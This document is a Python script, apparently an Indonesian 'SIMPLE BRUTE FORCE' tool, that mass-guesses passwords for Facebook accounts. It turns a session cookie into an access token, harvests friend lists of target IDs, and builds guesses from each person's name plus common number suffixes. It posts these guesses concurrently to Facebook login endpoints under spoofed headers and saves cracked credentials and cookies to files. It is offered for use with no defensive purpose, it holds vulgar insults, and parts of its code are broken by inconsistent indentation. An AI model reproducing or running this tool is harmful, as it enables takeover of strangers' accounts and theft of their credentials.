#-----------------[ IMPORT-MODULE ]-------------------
import re,os,sys,rich,bs4,time, json,urllib3,base64,random,datetime,requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich.panel import Panel as nel
from rich.table import Table
from rich.panel import Panel as nel
from rich.table import Table as me
#----------[ GLOBAL-NAME ]----------#
#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import re,requests,os,time
import os,sys
import socket,threading
import datetime
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as AsepXc
from bs4 import BeautifulSoup as parse
from time import time as mek
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.console import Console
from rich import print as cetak
from rich.columns import Columns
from rich import print as Buat
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from getpass import getpass
from rich.text import Text as tekz
from rich.progress import track
from pwinput import pwinput
from rich.console import Console
wa = Console()
console = Console()
pretty.install()
CON=sol()
## RANDOM UA#

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000) :
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='TV BOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.35'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='Lenovo TB-X505X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.35'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='Magnet_G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.35'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.35'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.35'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='SM-T720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.35'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Safari/537.36 OPR/97.0.3366.116'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning"
	elif 12 <= hours < 15:timenow = "good afternoon"
	elif 15 <= hours < 18:timenow = "good evening"
	else:timenow = "good night"
	return timenow
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	alvino_xy(f'''\t{asu}                    
          {h} .-.-..
          /+/++//
         /+/++//
 {k} *   * {h}/+/++//
   \ /  |/__//
 [{m}•{h}]{h}v[{m}•{h}]{p}|{b}SIMPLE BRUTE FORCE{p}|==========.
   {h}({m}'{h})  {h}/'|'\                          {p}\\
       {h}/  \  \                         {p}'
       {h}\_  \_ \_               {p}___{m}SBF {k}2.0{p}___
''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tSARAN EXTENSION : [green]COOKIEDOUGH[white]'))
		ses = requests.Session()
		cok = input('\nMasukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(access_token)
					cokiew = open(".cok.txt", "w").write(cok)
					print('\nlogin berhasil jalankan lagi scnya')
				else:
					exit('\n[+] login gagal')
		
	except Exception as e:
		print('\n ╰─  Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()

#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies telah modar ')
		time.sleep(2)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('\tHEY [green]%s[white] NGENTOD'%(my_name)))
	
	alvino_xy(h+ f'>> Your Idz : '+str(my_id))
    
     
	print('')
	print(h+ '➪ 1. Gass Crack ')
	#print('➪ 2. Crack Follower ')
	#print('➪ 3. Crack Grup   ')
	#print('➪ 4. Crack File	')
	#print('➪ 5. Hasil Crack  ')
	#print('➪ 6. Cek Opsi Akun Chekpoint  ')
	print('➪ 0. Keluar       ')

	_____alvino__adijaya_____ = input('\n➪ Pilih : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		dump_follower()
	elif _____alvino__adijaya_____ in ['3']:
		error()
	elif _____alvino__adijaya_____ in ['4']:
		crack_file()
	elif _____alvino__adijaya_____ in ['5']:
		result()
	elif _____alvino__adijaya_____ in ['6']:
		file_cp() 
	elif _____alvino__adijaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('➪ Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('➪ Pilih Yang Bener ngentod ')
		back()
def error():
	print(f'{k}➪ Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('➪ Hasil OK Anda ')
	print('➪ Hasil CP Anda ')
	print('➪ Kembali	')
	kz = input('\n➪ Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('➪ Filemu kagak ada ngen ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('➪ Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('➪ Mau Berapa ID ? : '))
	except ValueError:
		print('➪ Masukkan Angka, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('➪ Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('➪ Masukkan Id Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('➪ Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f' Total Id Terkumpul 😍 {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('➪ Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'➪{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}>> 1. Akun tua ')
	print('>> 2. Akun New ')
	print('>> 3. Random ')
	print('')
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print('>> 1. Mobile ')
	print('>> 2. Mbasic ')
	print('>> 3. Touch  ')
	print('>> 4. Mtouch ')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('>> Tambahkan Aplikasi Terkait ( Y/t ) ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('>> Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+''+frs)
					pwv.append(frs+'1122334455')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'0750')
					pwv.append(frs+'112233')
                                        pwv.append(frs+'1234')
                                        pwv.append(frs+'12345')
                                        pwv.append(frs+'123456')
                                        pwv.append(frs+'123456789')
                                        pwv.append(frs+'4321')
                                        pwv.append(frs+'321')
                                        pwv.append(frs+'54321')
                                        pwv.append('123'+frs)
                                        pwv.append('1234'+frs)
                                        pwv.append('12345'+frs)
                                        pwv.append('123456'+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append(frs+'123')
					pwv.append(frs+''+frs)
					pwv.append(frs+'1122334455')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'0750')
					pwv.append(frs+'112233')
                                        pwv.append(frs+'1234')
                                        pwv.append(frs+'12345')
                                        pwv.append(frs+'123456')
                                        pwv.append(frs+'123456')
                                        pwv.append(frs+'123456789')
                                        pwv.append(frs+'1234567890')
                                        pwv.append(frs+'4321')
                                        pwv.append(frs+'321')
                                        pwv.append(frs+'54321')
                                        pwv.append('123'+frs)
                                        pwv.append('1234'+frs)
                                        pwv.append('12345'+frs)
                                        pwv.append('123456'+frs)
                                        
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crack,idf,pwv)
			elif 'touch' in method:
				pool.submit(crack,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Selesai wey, syukuri aja hasil maling soalnya klo mau ijo print aja xix[cyan] <<[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	rr = random.randint
	rusa = [f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(111,117))}.0.0.0 Mobile Safari/537.36']
	ua = random.choice(rusa) 
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fopikini.com%252Flogin-ke-messenger-sekarang-bisa-tanpa-akun-facebook%252F&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=touch&locale=id_ID&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=846541629354251&kid_directed_site=0&app_id=846541629354251&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D846541629354251%26redirect_uri%3Dhttps%253A%252F%252Fwww.telkomsel.com%252Flogin%252Fauth%252Fsocial-media-cb%26scope%3Dpublic_profile%2Bemail%26code_challenge%3DmZFF9Ypv1f1SqI-NqfUXtWwxZpjAAoxQT7htGS23nn8%26code_challenge_method%3DS256%26state%3D4x4ttvsn7fywfpvc2uuujbafoo4towe%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2a88e02a-97b9-4912-bc3c-8ebad72b1edb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.telkomsel.com%2Flogin%2Fauth%2Fsocial-media-cb%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4x4ttvsn7fywfpvc2uuujbafoo4towe%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1690698519&subno_key=AaGmDXy75h_Nq8RaJTfUWTXuP_pOzXUjB8bI2psBybKz0BUWu1IoP7cGjKzOizBJ_qDXts6spS7K5axET1_EcDdAFs3nLIINoHoWeDF-7kfL_x_6517sx8I9apz1IOFt93QfqQOFr4VPw8Rvy9RUVHe0f4tIfWxxJWhXm1jKyegfxG3kjztm8mlORre5k1SIlOvc3Sr802bvbFVULB13JDU_3wTCxIV1FXyqbwE7u-vQ96sYg8y3s2q1x_1TLLtRj5Rkgbir2lXUm76m2BqZT87IBxXRSmW6oPkJ83eiVb2AF3ikfXTbGlKTmBouWpHUoWQ&hrc=1&wtsid=rdr_0D12mhC21tbdBJGyk&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=8a126e6834eac190cadacc5c431aa102&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fopikini.com%252Flogin-ke-messenger-sekarang-bisa-tanpa-akun-facebook%252F%26loggedout_browser_id%3D83effb43cec3569d5ac2b2241fef2d637a2b2126&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[yellow]CP").add(f"[yellow]{idf}|{pw}")
				tree.add(f"[yellow]{ua}\n")
				cetak(tree)
				#os.popen('play-audio /sdcard/ZMBF/cp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree(f"  ")
				tree.add(f"[green]OK").add(f"[green]{idf}|{pw}")
				tree.add(f"[purple]{kuki}\n")
				cetak(tree) 
				#os.popen('play-audio /sdcard/ZMBF/ok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
